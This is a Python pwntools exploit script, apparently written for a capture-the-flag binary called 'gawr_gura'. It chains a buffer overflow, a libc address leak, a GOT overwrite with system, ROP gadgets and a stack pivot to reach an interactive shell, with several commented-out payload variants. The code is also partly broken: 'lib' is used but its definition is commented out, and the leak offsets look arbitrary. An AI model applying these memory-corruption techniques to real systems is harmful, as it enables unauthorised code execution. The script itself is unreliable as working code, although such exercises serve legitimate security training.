#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

# context.arch = 'amd64' #設定目標機的資訊
# lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process('gawr_gura_distribute/share/gawr_gura') #檔名


print("send 5 (Input)")
pause()
p.send(b'5')

print("send msg (Input into note)")
pause()
p.send(b'a'*0x2c)

print("send get msg send 6 (show address)")
pause()
p.send(b'6')

stdout = u64(p.recvuntil('Write')[7794:7800].ljust(8,b'\x00'))
base = stdout - lib.sym['_IO_2_1_stdout_']
syscalls = base + lib.sym['__libc_system']
success('base: 0x%x',base)
success('total: 0x%x',syscalls)


print("Suggest (overwrite) back to main")
pause()
# p.send(b"a"*0x50 + p64(0x000000000040708c)+p64(0x0000000000401637))
p.send(b"a"*0x50 + p64(0x0000000000000000)+p64(0x0000000000401639))

print("send 5 (Input)")
pause()
p.send(b'5')

print("send msg (Input into note overwrite Got table)")
pause()
pop_rdi = 0x00000000004018c3
# sh = next(lib.search(b'/bin/sh'))+base
# sh = 0x41ee7
ret = 0x000000000040101a
pop_rsp = 0x00000000004018bd
sh = base + 0xe6c84
# payload = b'a'*4 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(syscalls)
# payload = b'a'*4 + p64(pop_rsp) +
p.send(b'a'*0x2c+p64(syscalls))

# p.send( payload )

print("send 1 (print name)")
pause()
p.send(b'1')

print("Suggest (stack pivoiting)")
pause()
p.send(b"a"*0x50 + p64(0x0000000000407090)+p64(0x0000000000401637))
# p.send(p64(pop_rdi) + p64(sh) + p64(ret) + p64(syscalls) + b"a"*0x50 + p64(0x0000000000407090)+p64(0x0000000000401637))

p.interactive()


# system = 